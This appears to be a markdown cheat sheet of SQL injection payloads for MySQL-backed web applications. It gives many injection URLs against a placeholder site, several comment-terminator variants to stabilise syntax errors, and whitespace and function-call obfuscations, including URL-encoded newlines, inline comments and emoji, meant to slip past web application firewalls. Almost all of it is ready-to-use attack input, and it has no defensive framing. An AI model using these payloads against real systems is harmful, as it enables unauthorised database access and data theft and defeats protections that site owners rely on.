## Stabilise the error message
Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error. This usually happens when server doesn't accept ```-- -``` inside the queries. 

```http://domain.com/index.php?id=1' order by 1)--```   
```http://domain.com/index.php?id=1' order by 1))--```  
```http://domain.com/index.php?id=1' order by 1;%00```     
```http://domain.com/index.php?id=1' order by 1));%00```   
```http://domain.com/index.php?id=1' order by 1;%60```    
```http://domain.com/index.php?id=1' order by 1%23```    
```http://domain.com/index.php?id=1' order by 1%60```    
```http://domain.com/index.php?id=1' order by 1%90```   
```http://domain.com/index.php?id=1'%23/* order by 1```  
```http://domain.com/index.php?id=1') order by 1```  
```http://domain.com/index.php?id=1' order by 1") ;%00```  
```http://domain.com/index.php?id=1' order by 1#--+```  
```http://domain.com/index.php?id=1' order by 1'))%23``` 


If MySQL Syntax Error still persists, simply try again the payloads, but this time, without ```-- -```


## Whitespace WAF-based bypass

Whenever the WAF blocks the query to include space/whitespace, you can easy replace with the following payloads:  

```
/**/
/**_**/
%23nuLL%0A
%23qa%0A%23%0A
%23foo*%2F*bar%0D%0A
+
```

For example, you can replace the whitespaces on the following payload:  
```http://domain.com/index.php?id=1' order by 1-- -```  
with  
```http://domain.com/index.php?id=1'/**/order/**/by/**/1--/**/-```  
or with  
```http://domain.com/index.php?id=1'%23nuLL%0Aorder%23nuLL%0Aby%23nuLL%0A1--%23nuLL%0A-```  
and so on...

## Whitespace Bypass via Emoji

```
/*️*/
/*️⃣*/
```

For example:  
```http://domain.com/index.php?id=1'/*️*/order/*️*/by/*️*/1--/*️*/-```

## WAF blocks retrieving information from database()

Simply replace ```database()``` with one of the following payload:  
```database/*badd*//**/()```  
```database%23%0A(%23%0A)```
